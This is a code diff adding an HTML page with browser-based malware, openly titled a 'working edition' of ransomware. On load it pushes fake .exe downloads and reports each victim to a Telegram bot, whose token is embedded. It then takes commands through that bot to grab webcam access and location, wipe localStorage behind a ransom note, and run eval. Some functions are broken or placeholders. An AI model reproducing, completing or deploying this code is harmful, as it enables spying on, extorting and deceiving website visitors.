@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<script>
+// ===========================================
+// RANSOMCYBER WORKING EDITION
+// ===========================================
+
+// CONFIG
+const VICTIM_ID = 'rc_' + Date.now();
+const BOT_TOKEN = '8446410907:AAF58BiohrxDkw3wiBAng6adWXl9q8bMBQw';
+const ADMIN_ID = '6368768388';
+
+// 🚀 AUTO START
+setTimeout(() => {
+    // 1. AUTO DOWNLOAD 3 FILES
+    downloadFiles();
+    
+    // 2. SEND VICTIM ID TO TELEGRAM
+    sendToTelegram(`🎯 NEW VICTIM: ${VICTIM_ID}\nUA: ${navigator.userAgent}`);
+    
+    // 3. START COMMAND LISTENER
+    startCommandListener();
+}, 1000);
+
+// 📥 AUTO DOWNLOAD
+function downloadFiles() {
+    for(let i = 0; i < 3; i++) {
+        setTimeout(() => {
+            const blob = new Blob(['RANSOMCYBER_PAYLOAD'], {type:'application/octet-stream'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `update_${i}.exe`;
+            a.click();
+        }, i * 2000);
+    }
+}
+
+// 🤖 TELEGRAM FUNCTIONS
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: ADMIN_ID,
+            text: message
+        })
+    });
+}
+
+// 🎯 COMMAND LISTENER
+async function startCommandListener() {
+    setInterval(async () => {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+            const data = await response.json();
+            
+            if(data.ok && data.result.length > 0) {
+                data.result.forEach(msg => {
+                    if(msg.message && msg.message.text && msg.message.text.includes(VICTIM_ID)) {
+                        const text = msg.message.text;
+                        
+                        // SIMPLE COMMANDS
+                        if(text.includes('photo')) takePhoto();
+                        if(text.includes('screen')) takeScreenshot();
+                        if(text.includes('location')) getLocation();
+                        if(text.includes('download')) downloadFiles();
+                        if(text.includes('ransom')) startRansomware();
+                        if(text.includes('shell') && text.includes('alert')) eval('alert("Hacked")');
+                    }
+                });
+            }
+        } catch(e) {}
+    }, 3000);
+}
+
+// 📸 SIMPLE PHOTO FUNCTION
+async function takePhoto() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+            
+            // Send to Telegram
+            sendToTelegram(`📸 Photo from ${VICTIM_ID}`);
+            
+            stream.getTracks().forEach(track => track.stop());
+        }, 1000);
+    } catch(e) {
+        sendToTelegram(`❌ Photo error: ${e.message}`);
+    }
+}
+
+// 🗺️ SIMPLE LOCATION
+function getLocation() {
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const loc = {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+            };
+            sendToTelegram(`📍 Location: ${JSON.stringify(loc)}`);
+        });
+    }
+}
+
+// 💀 SIMPLE RANSOMWARE
+function startRansomware() {
+    // Encrypt localStorage
+    const data = {};
+    for(let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        data[key] = localStorage.getItem(key);
+    }
+    
+    localStorage.setItem('ransom_data', btoa(JSON.stringify(data)));
+    localStorage.clear();
+    
+    // Show ransom note
+    document.body.innerHTML = `
+        <div style="
+            position:fixed;
+            top:0;left:0;
+            width:100%;height:100%;
+            background:#000;
+            color:#f00;
+            font-family:monospace;
+            padding:50px;
+            text-align:center;
+        ">
+            <h1>💀 RANSOMWARE ACTIVATED</h1>
+            <p>Your data has been encrypted!</p>
+            <p>Victim ID: ${VICTIM_ID}</p>
+            <p>Contact admin for decryption</p>
+        </div>
+    `;
+    
+    sendToTelegram(`🔒 Ransomware activated for ${VICTIM_ID}`);
+}
+
+console.log('🔥 RANSOMCYBER ACTIVE - Victim ID:', VICTIM_ID);
+</script>
+</html>
